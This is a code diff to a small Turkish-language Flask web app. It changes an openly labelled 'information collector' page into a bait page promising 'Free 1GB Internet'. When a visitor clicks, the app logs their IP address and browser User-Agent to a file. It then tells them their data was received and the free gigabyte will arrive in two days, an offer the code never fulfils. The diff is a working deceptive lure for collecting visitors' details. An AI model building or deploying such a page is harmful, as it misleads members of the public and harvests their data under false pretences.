@@ -1,6 +1,14 @@
 from flask import Flask, request, render_template_string
+import logging
 
 app = Flask(__name__)
+
+# Logger yapılandırması
+logging.basicConfig(
+    filename='ip.log',
+    level=logging.INFO,
+    format='%(asctime)s - IP: %(message)s - Tarayıcı: %(message)s'
+)
 
 # Ana sayfa için HTML içeriği
 INDEX_HTML = """
@@ -8,7 +16,7 @@ INDEX_HTML = """
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>Bilgi Toplayıcı</title>
+    <title>Bedava 1GB İnternet</title>
     <style>
         body { font-family: Arial, sans-serif; margin: 40px; }
         h1 { color: #333; }
@@ -16,9 +24,9 @@ INDEX_HTML = """
     </style>
 </head>
 <body>
-    <h1>Bilgi Toplama Aracı</h1>
+    <h1>Bedava 1GB İnternet</h1>
     <form action="/collect-data" method="post">
-        <button type="submit">Bilgileri Gönder</button>
+        <button type="submit">Tıkla!</button>
     </form>
 </body>
 </html>
@@ -30,7 +38,7 @@ DATA_HTML = """
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>Toplanan Bilgiler</title>
+    <title>1GB Aldın!</title>
     <style>
         body { font-family: Arial, sans-serif; margin: 40px; }
         h1 { color: #333; }
@@ -40,7 +48,8 @@ DATA_HTML = """
     </style>
 </head>
 <body>
-    <h1>Toplanan Bilgiler</h1>
+    <h1>Verileriniz Alındı.</h1>
+    <h2>2 Gün İçinde Gelecektir Sabırlı Olun.<h2>
     <ul>
         <li><strong>IP Adresi:</strong> {{ ip_address }}</li>
         <li><strong>Tarayıcı:</strong> {{ user_agent }}</li>
@@ -51,14 +60,18 @@ DATA_HTML = """
 
 @app.route('/')
 def index():
-    """Ana sayfa: Bilgi toplama formu."""
+    """Verileriniz Alındı."""
     return render_template_string(INDEX_HTML)
 
 @app.route('/collect-data', methods=['POST'])
 def collect_data():
-    """Kullanıcıdan gelen verileri alır ve görüntüler."""
+    """Verileriniz Alındı."""
     ip_address = request.remote_addr
     user_agent = request.headers.get('User-Agent')
+
+    # Toplanan verileri .log dosyasına yaz
+    logging.info(f"IP Adresi: {ip_address}, Tarayıcı: {user_agent}")
+
     return render_template_string(DATA_HTML, ip_address=ip_address, user_agent=user_agent)
 
 if __name__ == '__main__':
